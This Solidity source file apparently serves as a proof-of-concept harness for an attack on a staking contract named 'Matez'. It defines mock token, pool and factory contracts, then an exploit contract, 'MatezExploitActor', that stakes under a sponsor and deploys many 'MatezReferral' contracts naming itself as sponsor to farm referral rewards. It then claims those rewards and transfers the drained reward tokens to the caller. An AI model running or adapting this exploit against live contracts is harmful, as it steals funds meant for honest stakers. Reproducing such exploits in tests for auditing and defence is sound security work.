// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

contract MockToken {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "balance"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "balance");
        if (msg.sender != from) { require(allowance[from][msg.sender] >= amount, "allowance"); allowance[from][msg.sender] -= amount; }
        balanceOf[from] -= amount; balanceOf[to] += amount; return true;
    }
}

contract MockPool {
    function observe(uint32[] calldata) external pure returns (int56[] memory ticks, uint160[] memory secondsPerLiquidity) {
        ticks = new int56[](2); secondsPerLiquidity = new uint160[](2); return (ticks, secondsPerLiquidity);
    }
}

contract MockFactory {
    address public pool;
    constructor(address p) { pool = p; }
    function getPool(address, address, uint24) external view returns (address) { return pool; }
}

interface IMatezLike { function register(address) external; function stake(uint256) external; function claim(uint40,uint40,uint256) external; }
interface IERC20Like { function transfer(address,uint256) external returns (bool); function balanceOf(address) external view returns (uint256); }

contract MatezReferral {
    constructor(address staking, address sponsor, uint256 amount) {
        IMatezLike(staking).register(sponsor);
        IMatezLike(staking).stake(amount);
    }
}

contract MatezExploitActor {
    function attack(address staking, address rewardToken, address sponsor, uint256 amount, uint256 referrals) external {
        IMatezLike(staking).register(sponsor);
        IMatezLike(staking).stake(amount);
        for (uint256 i = 0; i < referrals; i++) new MatezReferral(staking, address(this), amount);
        IMatezLike(staking).claim(3, 1, 0);
        uint256 bal = IERC20Like(rewardToken).balanceOf(address(this));
        IERC20Like(rewardToken).transfer(msg.sender, bal);
    }
}
